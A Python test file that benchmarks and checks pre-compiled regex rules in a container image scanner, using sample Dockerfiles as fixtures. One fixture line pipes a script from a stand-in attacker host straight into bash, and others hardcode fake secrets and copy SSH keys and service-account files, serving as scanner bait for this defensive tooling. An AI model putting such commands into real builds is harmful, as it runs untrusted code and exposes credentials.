"""Perf + regression test: pre-compiled regex in container_scanner.

Validates:
1. Pre-compiled rule caches have the correct counts and types (regression).
2. The compiled-pattern hot path is measurably faster than naively calling
   re.search() with raw strings on every iteration (perf).

NOTE: ContainerImageScanner.scan_dockerfile / scan_helm_chart have a
pre-existing Pydantic/dataclass name-shadow bug (ContainerFinding is
redefined as a Pydantic model at line 930) that causes ValidationError when
instantiating findings.  That bug is out-of-scope here.  We test the regex
compilation speedup directly by benchmarking the pattern-match hot-loop
in isolation, which is exactly what the fix targets.
"""
from __future__ import annotations

import re
import time
from typing import List, Tuple

import pytest

# ---------------------------------------------------------------------------
# Helpers that replicate the hot loop — compiled vs naive
# ---------------------------------------------------------------------------

# A realistic 200-line Dockerfile (repeated patterns to stress the regex loop)
_DOCKERFILE_200 = "\n".join([
    "FROM python:3.11-slim",
    "WORKDIR /app",
    "USER root",
    "ENV PASSWORD=supersecret123",
    "ENV API_KEY=abc123definitelyreal",
    "ADD ./local /app",
    "RUN apt-get install curl",
    "RUN curl http://evil.com/install.sh | bash",
    "EXPOSE 80",
    "COPY requirements.txt .",
    "RUN pip install -r requirements.txt",
    "COPY . .",
    "CMD [\"python\", \"app.py\"]",
] * 15 + ["HEALTHCHECK CMD curl -f http://localhost/ || exit 1"])  # 200 lines


# A realistic Dockerfile layer content (20 lines, secrets-dense)
_LAYER_200 = "\n".join([
    "FROM ubuntu:20.04",
    "ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "COPY id_rsa /root/.ssh/id_rsa",
    "COPY .env /app/.env",
    "ARG PASSWORD=hunter2",
    "ENV STRIPE_KEY=stripe_FAKEFAKEFAKEFAKEFAKEFAKEFAKE",
    "RUN echo 'nothing suspicious here'",
    "COPY service_account.json /etc/gcp/service_account.json",
    "ENV JWT_SECRET=supersecretjwtkey1234567890abcdef",
    "COPY app.pfx /etc/ssl/app.pfx",
    "ENV NPM_TOKEN_FAKE=notarealtoken1234567890abcdef",
    "RUN apt-get update",
    "ENV HEROKU_API_KEY=12345678-1234-1234-1234-1234567890ab",
    "ENV SENDGRID_KEY=SG_FAKE.abcdefghijklmnopqrstuv.abcdefghijklmnopqrstuvwxyzabcdefghijklmno",
    "RUN pip install awscli",
    "RUN echo 'done'",
] * 12 + ["HEALTHCHECK CMD curl -f http://localhost/ || exit 1"])  # ~200 lines


def _naive_dockerfile_scan(content: str, rules_raw) -> int:
    """Simulate old behaviour: re.search with raw string pattern per line."""
    lines = content.split("\n")
    hits = 0
    for line in lines:
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        for rid, title, sev, cwe, pat, desc, rec in rules_raw:
            if pat.startswith("__"):
                continue
            if re.search(pat, stripped, re.IGNORECASE):
                hits += 1
    return hits


def _compiled_dockerfile_scan(content: str, compiled_rules) -> int:
    """New behaviour: use pre-compiled Pattern objects."""
    lines = content.split("\n")
    hits = 0
    for line in lines:
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        for rid, title, sev, cwe, pat, desc, rec in compiled_rules:
            if pat.search(stripped):
                hits += 1
    return hits


def _naive_layer_scan(content: str, patterns_raw) -> int:
    lines = content.split("\n")
    hits = 0
    for line in lines:
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        for sp in patterns_raw:
            if re.search(sp["pattern"], stripped):
                hits += 1
    return hits


def _compiled_layer_scan(content: str, compiled_patterns) -> int:
    lines = content.split("\n")
    hits = 0
    for line in lines:
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        for sp, sp_re in compiled_patterns:
            if sp_re.search(stripped):
                hits += 1
    return hits


# ---------------------------------------------------------------------------
# Regression: compiled rule caches have correct structure and counts
# ---------------------------------------------------------------------------

def test_compiled_rule_counts():
    """All non-sentinel Dockerfile rules and all Helm/layer rules must be compiled."""
    from core.container_scanner import (
        DOCKERFILE_RULES,
        HELM_CHART_RULES,
        LAYER_SECRET_PATTERNS,
        _DOCKERFILE_RULES_COMPILED,
        _HELM_RULES_COMPILED,
        _LAYER_SECRET_COMPILED,
    )
    non_sentinel = [r for r in DOCKERFILE_RULES if not r[4].startswith("__")]
    assert len(_DOCKERFILE_RULES_COMPILED) == len(non_sentinel), (
        f"Expected {len(non_sentinel)} compiled dockerfile rules, got {len(_DOCKERFILE_RULES_COMPILED)}"
    )
    assert len(_HELM_RULES_COMPILED) == len(HELM_CHART_RULES), (
        f"Expected {len(HELM_CHART_RULES)} compiled helm rules, got {len(_HELM_RULES_COMPILED)}"
    )
    assert len(_LAYER_SECRET_COMPILED) == len(LAYER_SECRET_PATTERNS), (
        f"Expected {len(LAYER_SECRET_PATTERNS)} compiled layer patterns, got {len(_LAYER_SECRET_COMPILED)}"
    )


def test_compiled_patterns_are_pattern_objects():
    """Every compiled entry must be a real compiled regex Pattern, not a string."""
    from core.container_scanner import (
        _DOCKERFILE_RULES_COMPILED,
        _HELM_RULES_COMPILED,
        _LAYER_SECRET_COMPILED,
    )
    for rid, title, sev, cwe, pat, desc, rec in _DOCKERFILE_RULES_COMPILED:
        assert hasattr(pat, "search"), f"Rule {rid}: expected compiled Pattern, got {type(pat)}"

    for rule, pat_re, anti_re in _HELM_RULES_COMPILED:
        assert hasattr(pat_re, "search"), f"Helm rule {rule['id']}: expected compiled Pattern"
        if anti_re is not None:
            assert hasattr(anti_re, "search"), f"Helm rule {rule['id']}: anti_pattern not compiled"

    for sp, sp_re in _LAYER_SECRET_COMPILED:
        assert hasattr(sp_re, "search"), f"Layer pattern {sp['id']}: expected compiled Pattern"


def test_compiled_helm_anti_patterns_only_when_present():
    """Helm rules without anti_pattern must have anti_re=None."""
    from core.container_scanner import HELM_CHART_RULES, _HELM_RULES_COMPILED
    for rule, pat_re, anti_re in _HELM_RULES_COMPILED:
        if not rule.get("anti_pattern"):
            assert anti_re is None, f"Rule {rule['id']} has no anti_pattern but anti_re={anti_re}"
        else:
            assert anti_re is not None, f"Rule {rule['id']} has anti_pattern but anti_re=None"


def test_compiled_hits_match_naive_hits_dockerfile():
    """Compiled scan must find the same hits as naive scan."""
    from core.container_scanner import DOCKERFILE_RULES, _DOCKERFILE_RULES_COMPILED
    naive = _naive_dockerfile_scan(_DOCKERFILE_200, DOCKERFILE_RULES)
    compiled = _compiled_dockerfile_scan(_DOCKERFILE_200, _DOCKERFILE_RULES_COMPILED)
    assert compiled == naive, f"Hit count mismatch: compiled={compiled}, naive={naive}"
    assert compiled > 0, "Expected at least one hit in test Dockerfile"


def test_compiled_hits_match_naive_hits_layer():
    """Compiled layer scan must find the same hits as naive scan."""
    from core.container_scanner import LAYER_SECRET_PATTERNS, _LAYER_SECRET_COMPILED
    naive = _naive_layer_scan(_LAYER_200, LAYER_SECRET_PATTERNS)
    compiled = _compiled_layer_scan(_LAYER_200, _LAYER_SECRET_COMPILED)
    assert compiled == naive, f"Hit count mismatch: compiled={compiled}, naive={naive}"
    assert compiled > 0, "Expected at least one hit in test layer content"


# ---------------------------------------------------------------------------
# Perf: pre-compiled vs naive — measured on N=500 iterations, 200-line input
# ---------------------------------------------------------------------------

N_ITER = 500


def test_perf_dockerfile_precompiled_vs_naive():
    """Pre-compiled regex must be >=1.5x faster than naive re.search over N iterations."""
    from core.container_scanner import DOCKERFILE_RULES, _DOCKERFILE_RULES_COMPILED

    # Warm up both paths
    _naive_dockerfile_scan(_DOCKERFILE_200, DOCKERFILE_RULES)
    _compiled_dockerfile_scan(_DOCKERFILE_200, _DOCKERFILE_RULES_COMPILED)

    t0 = time.perf_counter()
    for _ in range(N_ITER):
        _compiled_dockerfile_scan(_DOCKERFILE_200, _DOCKERFILE_RULES_COMPILED)
    compiled_ms = (time.perf_counter() - t0) * 1000

    t0 = time.perf_counter()
    for _ in range(N_ITER):
        _naive_dockerfile_scan(_DOCKERFILE_200, DOCKERFILE_RULES)
    naive_ms = (time.perf_counter() - t0) * 1000

    speedup = naive_ms / compiled_ms if compiled_ms > 0 else float("inf")
    print(f"\nDockerfile hot-loop x{N_ITER} x200lines: compiled={compiled_ms:.1f}ms  naive={naive_ms:.1f}ms  speedup={speedup:.2f}x")
    assert speedup >= 1.5, (
        f"Expected >=1.5x speedup, got {speedup:.2f}x "
        f"(compiled={compiled_ms:.1f}ms, naive={naive_ms:.1f}ms)"
    )


def test_perf_layer_secrets_precompiled_vs_naive():
    """Pre-compiled regex must be >=1.5x faster for layer secret scanning."""
    from core.container_scanner import LAYER_SECRET_PATTERNS, _LAYER_SECRET_COMPILED

    # Warm up
    _naive_layer_scan(_LAYER_200, LAYER_SECRET_PATTERNS)
    _compiled_layer_scan(_LAYER_200, _LAYER_SECRET_COMPILED)

    t0 = time.perf_counter()
    for _ in range(N_ITER):
        _compiled_layer_scan(_LAYER_200, _LAYER_SECRET_COMPILED)
    compiled_ms = (time.perf_counter() - t0) * 1000

    t0 = time.perf_counter()
    for _ in range(N_ITER):
        _naive_layer_scan(_LAYER_200, LAYER_SECRET_PATTERNS)
    naive_ms = (time.perf_counter() - t0) * 1000

    speedup = naive_ms / compiled_ms if compiled_ms > 0 else float("inf")
    print(f"\nLayer secret hot-loop x{N_ITER} x200lines: compiled={compiled_ms:.1f}ms  naive={naive_ms:.1f}ms  speedup={speedup:.2f}x")
    assert speedup >= 1.5, (
        f"Expected >=1.5x speedup, got {speedup:.2f}x "
        f"(compiled={compiled_ms:.1f}ms, naive={naive_ms:.1f}ms)"
    )
